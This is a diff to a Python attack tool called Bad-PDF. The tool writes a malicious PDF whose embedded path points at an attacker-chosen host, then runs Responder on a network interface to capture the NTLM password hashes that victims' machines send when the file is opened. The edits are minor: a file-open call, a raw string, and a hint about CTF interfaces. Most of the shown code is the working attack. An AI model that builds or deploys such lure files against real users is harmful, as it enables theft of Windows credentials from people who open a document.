@@ -4,20 +4,6 @@ import io
 import os
 import subprocess
 
-"""
-====================================================================================================================
-        ______                 __       _______  ______   ________  
-        |_   _ \               |  ]     |_   __ \|_   _ `.|_   __  | 
-          | |_) |  ,--.    .--.| | ______ | |__) | | | `. \ | |_ \_| 
-          |  __'. `'_\ : / /'`' ||______||  ___/  | |  | | |  _|    
-         _| |__) |// | |,| \__/  |       _| |_    _| |_.' /_| |_     
-        |_______/ '-;__/ '.__.;__]     |_____|  |______.'|_____|
-        
-        This is tool use technique disclosed by the check point team to steal the NTLM hash using malicious PDF file.
-        Author : Deepu TV ; Alias DeepZec      Update : Surgat
-====================================================================================================================        
-"""
-
 responder = '/usr/sbin/responder'
 interface = 'eth0'
 RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'
@@ -25,7 +11,7 @@ RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', 
 
 def create_malpdf(filename, host):
     print("[*] Starting Process.. [*]")
-    with io.FileIO(filename, "w") as file:
+    with open(filename, "w") as file:
         file.write(r'''
 %PDF-1.7
 
@@ -99,7 +85,7 @@ trailer
 if __name__ == "__main__":
 
     try:
-        print("""
+        print(r"""
       
         ______                 __       _______  ______   ________  
         |_   _ \               |  ]     |_   __ \|_   _ `.|_   __  | 
@@ -122,7 +108,7 @@ if __name__ == "__main__":
 
         host = input("Please enter Bad-PDF host IP: \n")
         filename = input("Please enter output file name: \n")
-        interface = input("Please enter the interface name to listen (Default eth0): \n") or interface
+        interface = input("Please enter the interface name to listen (Default eth0, in ctf tun0): \n") or interface
         create_malpdf(filename, '\\\\' + '\\\\' + host + '\\\\')
 
         print(f"Bad PDF {filename} created")
